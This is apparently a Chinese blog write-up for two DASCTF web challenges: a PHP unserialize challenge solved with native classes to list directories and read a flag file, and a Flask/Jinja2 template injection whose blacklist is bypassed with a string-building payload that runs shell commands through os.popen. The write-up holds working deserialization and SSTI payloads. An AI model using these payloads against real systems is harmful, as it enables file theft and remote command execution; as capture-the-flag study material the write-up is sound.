---
title: dasctf
date: 2021-04-09 14:03:36
tags: wp

---
## ez_serialize        
利用原生类，扫描，读取文件        




	```php
	 <?php
	error_reporting(0);
	highlight_file(__FILE__);
	
	class A{
	    public $class;
	    public $para;
	    public $check;
	    public function __construct()
	    {
	        $this->class = "B";
	        $this->para = "ctfer";
	        echo new  $this->class ($this->para);
	    }
	    public function __wakeup()
	    {
	        $this->check = new C;
	        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
	            echo new  $this->class ($this->para);
	        }
	        else
	            die('bad hacker~');
	    }
	
	}
	class B{
	    var $a;
	    public function __construct($a)
	    {
	        $this->a = $a;
	        echo ("hello ".$this->a);
	    }
	}
	class C{
	
	    function vaild($code){
	        $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
	        if (preg_match($pattern, $code)){
	            return false;
	        }
	        else
	            return true;
	    }
	}
	
	
	if(isset($_GET['pop'])){
	    unserialize($_GET['pop']);
	}
	else{
	    $a=new A;
	
	} 
	```





初看平平无奇，也没啥危险函数，利用原生类了       



	    public function __wakeup()
	    {
	        $this->check = new C;
	        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
	            echo new  $this->class ($this->para);
	        }
	        else
	            die('bad hacker~');
	    }        



![01.png](https://sc02.alicdn.com/kf/U9a1978f1ecdb43efb14e616b95cca88eP.jpg)        



	```php
	<?php
	class A{
	    public $class='FilesystemIterator';
	    public $para='/var/www/html/';
	    public $check;
	}
	$a=new A();
	echo serialize($a);
	
	?>
	```



得到一个文件夹，然后再遍历这个文件夹，得到一个`flag.php`     
(这里用Diretorylterator的话，我在本地返回的是一个点）       
读取文件       



	```php
	<?php
	class A{
	    public $class='SplFileObject';
	    public $para="/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php";
	    public $check;
	    }
	
	$o  = new A();
	echo serialize($o);
	?>
	```


## baby_flask    
过滤的东西        



	blacklist</br>   
	'.','[','\'','"',''\\','+',':','_',</br>   
	'chr','pop','class','base','mro','init','globals','get',</br>   
	'eval','exec','os','popen','open','read',</br>   
	'select','url_for','get_flashed_messages','config','request',</br>   
	'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'</br>    
	</br>



join拼接      


``{{[1,2,3]|join()}}``-----> ``123``      
``{{[1,2,3]|join('|')}}``----->``1|2|3``
	
	{%set a=dict(po=aa,p=aa)|join%} # pop
	{%set b=lipsum|string|list|attr(a)(𝟙𝟠)%} # _
	{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%} # globals
	{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%} # getitem
	{%set e=dict(o=cc,s=aa)|join%} # os
	{%set f=lipsum|string|list|attr(a)(𝟡)%} # 空格
	{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%} # 斜杠
	{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%} # cat /flag
	{%set h=(a,dict(en=aa)|join|join)|join%} # popen
	{%set i=dict(re=aa,ad=aa)|join%} # read
	{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%} #点
	{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%} #ls /var/www/flask
	{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}}
	#最后拼接起来
	#{{lipsum.__globals__['os'].popen('ls /var/www/flask').read()}}       



[MORE1](http://www.plasf.cn/articles/dasctf202103.html)     
[MORE2](https://blog.csdn.net/rfrder/article/details/115272645)